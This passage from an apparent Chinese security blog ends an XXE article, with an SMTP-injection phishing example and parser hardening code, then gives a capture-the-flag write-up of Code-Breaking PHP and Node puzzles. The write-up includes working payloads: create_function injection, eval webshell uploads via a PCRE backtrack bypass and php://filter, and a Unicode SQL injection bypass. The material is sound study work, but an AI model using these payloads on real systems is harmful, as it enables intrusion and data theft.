class="number">3</span>A%<span class="number">20</span>support%<span class="number">40</span>VULNERABLESYSTEM.com%<span class="number">0</span>A</span><br><span class="line">To%<span class="number">3</span>A%<span class="number">20</span>victim%<span class="number">40</span>gmail.com%<span class="number">0</span>A</span><br><span class="line">Subject%<span class="number">3</span>A%<span class="number">20</span>test%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>A</span><br><span class="line">test!%<span class="number">0</span>A</span><br><span class="line">%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">.%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">QUIT%<span class="number">0</span>D%<span class="number">0</span>A</span><br><span class="line">:a@VULNERABLESYSTEM.com:<span class="number">25</span></span><br></pre></td></tr></table></figure><p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">ftp:<span class="comment">//a</span></span><br><span class="line">EHLO a</span><br><span class="line">MAIL FROM: <span class="xml"><span class="tag">&lt;<span class="name">support@VULNERABLESYSTEM.com</span>&gt;</span></span></span><br><span class="line">RCPT TO: &lt;victim@gmail.com&gt;</span><br><span class="line">DATA</span><br><span class="line">From: support@VULNERABLESYSTEM.com</span><br><span class="line">To: victim@gmail.com</span><br><span class="line">Subject: Reset your password</span><br><span class="line">We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com</span><br><span class="line">.</span><br><span class="line">QUIT</span><br><span class="line">:support@VULNERABLESYSTEM.com:25</span><br></pre></td></tr></table></figure><p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p><h1 id="XXE的防护"><a href="#XXE的防护" class="headerlink" title="XXE的防护"></a>XXE的防护</h1><p>在介绍成因的时候说过，<strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，所以防护方法就是<strong>使用语言中推荐的禁用外部实体的方法</strong>。</p><p><strong>PHP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p><strong>Java:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;,true);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;,false)</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;,false);</span><br></pre></td></tr></table></figure><p><strong>Python：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XXE作为2017最新发布的<code>OWASP TOP10</code>的漏洞，其广泛性和危害性不言而喻。其攻击手段也是多种多样，在和其他漏洞结合之后，可以产生惊人的效果。笔者对XXE做了很多的复现和研究，得到的一些感悟和收获。之后可能还会对扩展性的xml_Schema以及与其他漏洞的结合做进一步的深入学习研究。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3357">K0rz3n——一篇文章带你深入理解漏洞之 XXE 漏洞</a></li><li><a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></li><li><a href="https://www.cnblogs.com/likwo/archive/2011/08/24/2151793.html">XML文档解析的几种方式</a></li><li><a href="https://www.freebuf.com/column/156863.html">freebuf——XXE学习之路-STEP BY STEP</a></li><li><a href="https://www.freebuf.com/articles/web/177979.htm">freebuf——XXE漏洞利用技巧：从XML到远程代码执行</a></li><li>[DTD/XXE 攻击笔记分享](DTD/XXE 攻击笔记分享)</li><li><a href="https://wooyun.js.org/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html">你所不知道的XML安全</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>知识星球-代码审计Codebreak部分WP</title>
      <link href="/2019/01/16/CodeBreak/"/>
      <url>/2019/01/16/CodeBreak/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近既忙又懒，终于放了寒假，想起来看看p牛的<a href="https://code-breaking.com/">CodeBreaking-Puzzles</a>，学习一波。这里给P总的<strong>代码审计知识星球 小密圈</strong>打个广告，满满干货，个个都是人才，我超喜欢里面的。另外，很感谢网上现有的一些WP，帮助我这个菜鸡理解漏洞和学习。</p><h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$arg = $_GET[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">&#x27;&#x27;</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一题，就把我难住了，感叹一下自己有多菜。。。</p><p>其实代码逻辑很简单：</p><ol><li><p>这里<code>??</code>是php7+的用法，<code>$_GET[‘action’]非空则 $action = $_GET[‘action’]</code></p></li><li><p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p></li></ol><p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”\”。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。</p><p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442">http://blog.51cto.com/lovexm/1743442</a></p><p>禁用了<code>system()</code>函数，<code>exec()函数</code>、<code>passthru()函数</code>、<code>shell_exec()函数</code>,<code> popen()</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">Warning: system() has been disabled for security reasons in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(8) : runtime-created function on line 1</span><br></pre></td></tr></table></figure><p><code>file_put_contents</code>也没有写权限。只剩下<code>file_get_contens</code>和<code>print_r</code>可用。</p><p>参考王一航表哥的博客，<a href="https://www.jianshu.com/p/33bc37ef72cc">花式列目录，花式读文件</a></p><h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;print_r(glob(%22..&#x2F;*%22));&#x2F;&#x2F;</span><br><span class="line">Array ( [0] &#x3D;&gt; ..&#x2F;flag_h0w2execute_arb1trary_c0de [1] &#x3D;&gt; ..&#x2F;html )</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;51.158.75.42:8087&#x2F;?action&#x3D;\create_function&amp;arg&#x3D;;&#125;print_r(file_get_contents(%27..&#x2F;flag_h0w2execute_arb1trary_c0de%27));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">&#x27;data/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;bad request&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">&#x27;/&#x27;</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&quot;Location: $path&quot;</span>, <span class="literal">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码逻辑很简单，对上传的文件内容做正则检测，不符合正则形式，就进行跳转执行。</p><p>问题就落在了，如何绕过这个正则检测<code>preg_match</code>函数。</p><h3 id="PRCE＆分析"><a href="#PRCE＆分析" class="headerlink" title="PRCE＆分析"></a>PRCE＆分析</h3><p>谷歌<strong>PCRE特性</strong>，得到一篇解释的比较不错的文章——<a href="http://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制</a></p><p>PRCE使用NFA正则引擎。</p><blockquote><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态。</p><p>这是一种费贪婪匹配，非贪婪模式匹配原理简单来说是, 在可配也可不配的情况下（如 .* ）, 优先不匹配. 记录备选状态, 并将匹配控制交给正则表达式的下一个匹配字符, 当之后的匹配失败的时候, 再回溯, 进行匹配.</p></blockquote><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line"></span><br><span class="line">1. 源字符串: aaab</span><br><span class="line">2. 正则:     .*?b</span><br><span class="line"></span><br><span class="line">匹配过程开始的时候, “.*?”首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符”b”, “b”在源字符串位置1匹配失败(“a”), 于是回溯, 将匹配控制交回给”.*?”, 这个时候, “.*?”匹配一个字符”a”, 并再次将控制权交给”b”, 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯</span><br></pre></td></tr></table></figure><p>知道了这个，于是看这个题：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">preg_match(&#39;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#39;, $data)</span><br></pre></td></tr></table></figure><p>如果我们输入<code>&lt;?php print;abcd</code></p><p>正则的匹配控制权会先转移给  **[(<code>;?&gt;].** 于是先把</code>&lt;?php print;abcd<code>当做备选，然后发现d匹配不上这段正则，于是回溯到</code>&lt;?php print;abc<code>，发现c也匹配不到，回溯到b，...,最终回溯到</code>;`结束。</p><p>但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制。该回溯限制，可以查看，5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@ubuntu:/home/ldl<span class="comment"># php -a</span></span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line">string(7) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = fopen(<span class="string">&quot;poc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$msg = <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>.str_repeat(<span class="string">&quot;v&quot;</span>,<span class="number">1000000</span>);</span><br><span class="line">fwrite($f,$msg);</span><br><span class="line">fclose($f);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190116175800.png"></p><p>这里我傻了一下，没有先看<code>phpinfo</code>的禁用函数，使劲用<code>system（）</code>,怎么都没回显，害得我还以为是我上传出了问题。发现禁用了一些危险函数：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190116175948.png"></p><p>换一些payload，可以读目录和文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd&#x3D;print_r(scandir(&#39;..&#x2F;..&#x2F;..&#x2F;&#39;));</span><br><span class="line">cmd&#x3D;readfile(&#39;..&#x2F;..&#x2F;..&#x2F;flag_php7_2_1s_c0rrect&#39;);</span><br></pre></td></tr></table></figure><h1 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h1><p>功能上很明显直接用一个dig 命令查看一个可控的域名，记录到可控的日志中。</p><p><img src="http://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117200350.png"></p><p>关键代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;read-source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;DATA_DIR&#x27;</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/data/&#x27;</span> . md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;domain&#x27;</span>]) ? $_POST[<span class="string">&#x27;domain&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;log&#x27;</span>]) ? $_POST[<span class="string">&#x27;log&#x27;</span>] : date(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">    $command = sprintf(<span class="string">&quot;dig -t A -q %s&quot;</span>, escapeshellarg($domain));</span><br><span class="line">    $output = shell_exec($command);</span><br><span class="line"></span><br><span class="line">    $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line"></span><br><span class="line">    $log_name = $_SERVER[<span class="string">&#x27;SERVER_NAME&#x27;</span>] . $log_name;</span><br><span class="line">    <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>], <span class="literal">true</span>)) &#123;</span><br><span class="line">        file_put_contents($log_name, $output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $output;</span><br><span class="line"><span class="keyword">endif</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们能控制文件名和文件内容，但是文件内容被<code>htmlspecialchars</code>函数过滤了一次，尖括号没了，所以想直接写一个webshell是不可能的。</p><h3 id="php-filter-amp-file-put-contents"><a href="#php-filter-amp-file-put-contents" class="headerlink" title="php://filter&amp;file_put_contents"></a>php://filter&amp;file_put_contents</h3><p>这里涉及到一个php黑魔法，<code>php://filter</code>，<strong>只要是传filename的地方，基本都可以传协议流</strong>。</p><p>以前见到的情况和套路都是<code>include()、file_get_contents()</code>的参数可控，我们用<code>php://filter/read</code>配合<code>base64-encode</code>可以把文件编码成base64后输出。没想到<code>file_put_contents</code>文件名可控时也有magic</p><p>当我们可控的文件名<code>$filename</code>传入参数<code>php://filter/write=convert.base64-encode/resource=shell.php</code>，<code>$data</code>传入<code>djB3IHRlc3Q=</code>时，<code>file_put_contents($file,$text)</code>执行的内容如下：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117204908.png"></p><h3 id="几个trick"><a href="#几个trick" class="headerlink" title="几个trick"></a>几个trick</h3><p>那么思路也就很清晰了，我们可以通过这个方法向服务器写shell，但是还存在几个问题：</p><ol><li><p>后缀名过滤真的很严格</p></li><li><p><code>$log_name</code>之前会加上<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，似乎是不完全可控文件名</p></li></ol><p>第一、如何绕过文件检测，这里用到一个trick：<a href="http://wonderkun.cc/index.html/?p=626">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a>还有<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a></p><p>可以使用<code>/.</code>或者<code>\x0a</code>绕过。</p><p>第二、查看手册，发现我们可以通过修改<code>HTTP headers</code>中的``Host<code>的值从而控制</code>$_SERVER[‘SERVER_NAME’]`。那么文件名我们也完全可控了。</p><blockquote><p>Note:         在 Apache 2 里，必须设置 UseCanonicalName = On         和 ServerName。        否则该值会由客户端提供，就有可能被伪造。        上下文有安全性要求的环境里，不应该依赖此值。 </p></blockquote><p>第三、base64在解码时，如果参数中有非法字符（不在上面64个字符内的），就会跳过。(至少在php中是这样的)还有一点需要注意base64中的<code>=</code>只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有<code>=</code>。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&quot;&lt;?php @eval($_REQUEST[&#x27;123&#x27;]);?&gt;&quot;</span>)</span><br><span class="line"><span class="string">&#x27;PD9waHAgQGV2YWwoJF9SRVFVRVNUWycxMjMnXSk7Pz4=&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117231923.png"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190117232304.png"></p><h1 id="easy-phplimit"><a href="#easy-phplimit" class="headerlink" title="easy - phplimit"></a>easy - phplimit</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题目现在看，好像很简单。code参数传入一个执行的函数，与前面<code>；</code>匹配的话，就执行。</p><p>关键是一个<code>?R</code>的用法，不太明白也是参考这篇<a href="https://blog.csdn.net/technofiend/article/details/49906755">理解正则表达式中的(?R)递归</a>才有所发现：</p><blockquote><p>?R 表示正则递归匹配，</p></blockquote><p>在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $func1 = <span class="string">&quot;a(b(c()));&quot;</span>;</span><br><span class="line">  $func2 = <span class="string">&quot;a((b());&quot;</span>;</span><br><span class="line">  $func3 = <span class="string">&quot;a(b(c(parmer)));&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func1);</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func2);</span><br><span class="line">  <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  <span class="keyword">print</span> preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $func3);</span><br><span class="line">  </span><br><span class="line">输出：</span><br><span class="line">;</span><br><span class="line">a(();</span><br><span class="line">a(b(c(parmer)));[Finished in <span class="number">0.1</span>s]</span><br></pre></td></tr></table></figure><p>就是说，匹配的函数具有这样的特点：</p><ol><li>函数可以嵌套，最多一个参数</li><li>最里面的函数没有参数</li></ol><p>容易找到一些payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;phpinfo();</span><br><span class="line">?cmd&#x3D;print(readdir(opendir(getcwd()))); 可以列目录</span><br><span class="line">?cmd&#x3D;print(readfile(readdir(opendir(getcwd())))); 读文件</span><br><span class="line">?cmd&#x3D;print(dirname(dirname(getcwd()))); print出&#x2F;var&#x2F;www</span><br></pre></td></tr></table></figure><p>有的师傅们用了<code>get_defined_vars()</code>获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用<code>getallheaders()</code>来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过<code>current()、next()</code>进而选择可控参数,</p><h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;eval(next(current(get_defined_vars())));&amp;next&#x3D;var_dump(scandir(&#39;..&#x2F;&#39;));</span><br><span class="line">?code&#x3D;eval(next(current(get_defined_vars())));&amp;next&#x3D;var_dump(readfile(&#39;..&#x2F;flag_phpbyp4ss&#39;));</span><br></pre></td></tr></table></figure><p>看了大佬们的其他payload</p><ol><li><p>利用session_id函数，session可控。</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;51.158.75.42:8084&#x2F;?code&#x3D;eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line">PHPSESSID&#x3D;7072696e745f722866696c655f6765745f636f6e74656e747328222e2e2f666c61675f7068706279703473732229293b</span><br></pre></td></tr></table></figure></li><li><p>熟练运用文件操作函数和next指针函数0rz</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;print_r(scandir(dirname(chdir(dirname(getcwd()))))); </span><br><span class="line">code&#x3D;readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure></li></ol><h1 id="easy-–-nodechr"><a href="#easy-–-nodechr" class="headerlink" title="easy – nodechr"></a>easy – nodechr</h1><p>数据库结构：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE &quot;main&quot;.&quot;users&quot; (</span></span><br><span class="line"><span class="string">    &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">    &quot;username&quot; TEXT NOT NULL,</span></span><br><span class="line"><span class="string">    &quot;password&quot; TEXT,</span></span><br><span class="line"><span class="string">    CONSTRAINT &quot;unique_username&quot; UNIQUE (&quot;username&quot;)</span></span><br><span class="line"><span class="string">)`</span>)</span><br><span class="line"><span class="keyword">await</span> db.exec(<span class="string">`CREATE TABLE &quot;main&quot;.&quot;flags&quot; (</span></span><br><span class="line"><span class="string">    &quot;id&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">    &quot;flag&quot; TEXT NOT NULL</span></span><br><span class="line"><span class="string">)`</span>)</span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &#x27;<span class="subst">$&#123;username.toUpperCase()&#125;</span>&#x27; AND &quot;password&quot; = &#x27;<span class="subst">$&#123;password.toUpperCase()&#125;</span>&#x27;`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">&#x27;index&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先将用户名和密码通过safe过滤，因为会过滤<code>select</code>，没办法直接注入，但是注意到其SQL语句用到一个函数:</p><p><strong>toUpperCase()</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &#x27;<span class="subst">$&#123;username.toUpperCase()&#125;</span>&#x27; AND &quot;password&quot; = &#x27;<span class="subst">$&#123;password.toUpperCase()&#125;</span>&#x27;`</span>)</span><br></pre></td></tr></table></figure><p>这个函数在带头师傅的<a href="https://paper.tuisec.win/detail/a9ad1440249d95b">Unicode安全</a>与p牛的<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">Fuzz中的javascript大小写特性</a>均有提及，可以通过unicode的一些其他字符经过<code>toUpperCase()</code>变成英文字符，如<code>S</code>，从而绕过过滤。</p><blockquote><p> 其中混入了两个奇特的字符”ı”、”ſ”。</p><p>​    这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p></blockquote><p>把用户名和密码置空，后面用union查询flag，设置的session就是flag。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;0&amp;password&#x3D;0&#39; unıon ſelect 1,flag,3 from flags where &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>还发现很多语句会导致服务器500错误，推测是云服务过了限制如<code>#</code></p><hr><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.laruence.com/2010/06/08/1579.html">深悉正则(pcre)最大回溯/递归限制</a></li><li><a 